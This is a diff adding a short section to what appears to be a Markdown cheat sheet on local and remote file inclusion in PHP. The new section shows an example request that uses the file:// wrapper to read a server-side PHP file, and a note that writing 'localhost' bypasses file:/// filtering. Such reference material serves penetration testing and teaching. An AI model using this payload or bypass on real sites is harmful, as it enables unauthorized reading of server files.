@@ -151,6 +151,14 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 
 ## LFI / RFI using wrappers
 
+### Wrapper file://
+It is possible to use the [`file://`]([url](https://www.php.net/manual/en/wrappers.file.php)) wrapper in order to read file inside allowed paths (if `open_basedir` restriction in effect).
+
+```shell
+http://example.com/index.php?filename=file://localhost/var/www/html/secured_extranet/panel/security.php
+```
+Note that using `localhost` above bypasses `file:///` filtering.
+
 ### Wrapper php://filter
 
 The part "`php://filter`" is case insensitive
